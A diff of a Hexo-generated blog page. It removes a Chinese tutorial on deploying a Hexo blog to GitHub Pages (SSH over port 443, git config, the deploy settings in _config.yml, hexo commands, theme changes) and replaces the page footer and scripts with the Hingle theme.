-<p>但是你也有可能会遇到和我一样的问题使用ssh -T <a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#111;&#x6d;">&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#111;&#x6d;</a> 命令测试的时候会提示22号端口不可用这个时候就需要手动到将端口变成443端口</p>
-<p>1.首先.ssh目录下手动添加一个文件<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727151718492.png" alt="image-20230727151718492"></p>
-<p>2.在文件中写入以下命令行 </p>
-<blockquote>
-<p>Host github.com<br>User git<br>Hostname ssh.github.com<br>PreferredAuthentications publickey<br>IdentityFile ~&#x2F;.ssh&#x2F;id_rsa<br>Port 443</p>
-<p>Host gitlab.com<br>Hostname altssh.gitlab.com<br>User git<br>Port 443<br>PreferredAuthentications publickey<br>IdentityFile ~&#x2F;.ssh&#x2F;id_rsa</p>
-</blockquote>
-<p>再使用一下进行测试发现问题解决了可以正常通信了</p>
-<blockquote>
-<p>ssh -T <a href="mailto:&#103;&#105;&#116;&#64;&#103;&#105;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#x6f;&#109;">&#103;&#105;&#116;&#64;&#103;&#105;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#x6f;&#109;</a>      #后面的<a href="mailto:&#103;&#105;&#116;&#x40;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;</a>不用改</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727152503035.png" alt="image-20230727152503035"></p>
-<p>在选中的目录位置上输入cmd输入以下命令</p>
-<blockquote>
-<p>npm install hexo-deployer-git –save</p>
-</blockquote>
-<p>然后在刚刚打开的Git Bash Here上继续配置</p>
-<blockquote>
-<p>git config  –global user.name “luozhixiaowo”&#x2F;&#x2F; 你的github用户名，非昵称<br>git config  –global user.email “<a href="mailto:&#x78;&#x78;&#x78;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d;">&#x78;&#x78;&#x78;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d;</a>“&#x2F;&#x2F; 填写你的github注册邮箱</p>
-</blockquote>
-<h4 id="6-上传文件"><a href="#6-上传文件" class="headerlink" title="6.上传文件"></a>6.上传文件</h4><p>先在github创建一个属于你的库，库的名字为    github的用户名.github.io</p>
-<p>编辑你的blog目录下的_config.yml文件，将文件的最后改成下面这个样子</p>
-<blockquote>
-<ul>
-<li>#注意缩进如果最后三句缩进不一致可能会导致失败</li>
-</ul>
-</blockquote>
-<blockquote>
-<p>deploy:<br>      &nbsp; type: git	<br>      &nbsp; repository: <a href="mailto:&#x67;&#x69;&#x74;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#x2e;&#99;&#111;&#x6d;">&#x67;&#x69;&#x74;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#x2e;&#99;&#111;&#x6d;</a>:luozhixiaowo&#x2F;luozhixiaowo.github.io.git<br>      &nbsp; branch: main</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727154209250.png" alt="image-20230727154209250"></p>
-<p>最后上传</p>
-<blockquote>
-<p>hexo d</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727154609124.png" alt="image-20230727154609124"></p>
-<p>在创建的仓库中能看到你的博客网站等等</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727155357177.png" alt="image-20230727155357177"></p>
-<h4 id="7-最后就是有关于hexo命令的介绍"><a href="#7-最后就是有关于hexo命令的介绍" class="headerlink" title="7.最后就是有关于hexo命令的介绍"></a>7.最后就是有关于hexo命令的介绍</h4><blockquote>
-<p>hexo n “我的博客” &#x3D;&#x3D; hexo new “我的博客” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo g &#x3D;&#x3D; hexo generate #生成<br>hexo s &#x3D;&#x3D; hexo server #启动服务预览<br>hexo d &#x3D;&#x3D; hexo deploy #部署</p>
-<p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP<br>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令<br>hexo version  #查看Hexo的版本<br>hexo generate #生成静态页面至public目录</p>
-<p>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传</p>
-</blockquote>
-<h4 id="8-hexo目录结构"><a href="#8-hexo目录结构" class="headerlink" title="8.hexo目录结构"></a>8.hexo目录结构</h4><blockquote>
-<p>+– .deploy #hexo deploy生成的文件<br>+– node_modules #npm组件<br>+– public #生成的静态网页文件<br>+–scaffolds #模板<br>+– source #博客正文和其他源文件<br>| +– _posts #我们自己写的文章以md结尾<br>+– themes #主题<br>+– _config.yml #全局配置文件<br>– package.json #定义了hexo所需要的各种模块</p>
-</blockquote>
-<h4 id="9-搭建一个自己喜欢的hexo主题"><a href="#9-搭建一个自己喜欢的hexo主题" class="headerlink" title="9.搭建一个自己喜欢的hexo主题"></a>9.搭建一个自己喜欢的hexo主题</h4><p>去googel浏览器或者去b站搜索hexo主题然后下载压缩包解压出来后放入blog目录下的themes文件中</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727160121480.png" alt="image-20230727160121480"></p>
-<p>修改_config.yml文件中的theme</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727160311634.png" alt="image-20230727160311634"></p>
-<p>将theme：后面改成你刚刚放进themes文件中主题的名字就能成功更改主题了</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-    </div>
-    <a href="/2023/07/26/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/" class="go-post">阅读全文</a>
-</div>
-
-
-        <div class="page-current">
-    <div class="prev">
-        
-    </div>
-    <div class="page-index">
-        
-        <span class="current">1</span>
-        
-        <span>
-            <a class="page-num" href="/page/2/">2</a>
-            
-            
-        </span>
-        
-    </div>
-    <div class="next">
-        
-        <a class="page-num" href="/page/2/">
-            <i class="fa-solid fa-caret-right fa-fw"></i>
-        </a>
-        
-    </div>
-</div>
-
-    </div>
-    
-    <div id="home-card">
-        <div id="card-style">
-    <div id="card-div">
-        <div class="avatar">
-            <img src="/images/avatar.jpg" alt="avatar" />
-        </div>
-        <div class="name">John Doe</div>
-        <div class="description">
-            <p>Description<br>…</p>
-
-        </div>
-        
-        
-        <div class="friend-links">
-            
-            <div class="friend-link">
-                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
-            </div>
-            
-        </div>
-        
-    </div>
-</div>
-
-    </div>
-    
-</div>
-
-                <footer id="footer">
-    <div id="footer-wrap">
-        <div>
-            &copy;
-            2022 - 2023 Hexo
-            <span id="footer-icon">
-                <i class="fa-solid fa-font-awesome fa-fw"></i>
-            </span>
-            &commat;John Doe
-        </div>
-        <div>
-            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
-            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
-        </div>
-        
+        </section>
+        <section class="sub-footer">
+            <p>© 2023 <a href="/">Hexo</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
     </div>
 </footer>
 
-            </div>
-            
-            <transition name="fade">
-                <div id="preview" ref="preview" v-show="previewShow">
-                    <img id="preview-content" ref="previewContent" />
-                </div>
-            </transition>
-            
-        </div>
-        <script src="/js/main.js"></script>
-        
-    </body>
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":true,"night":true});</script>
+
+  </body>
 </html>
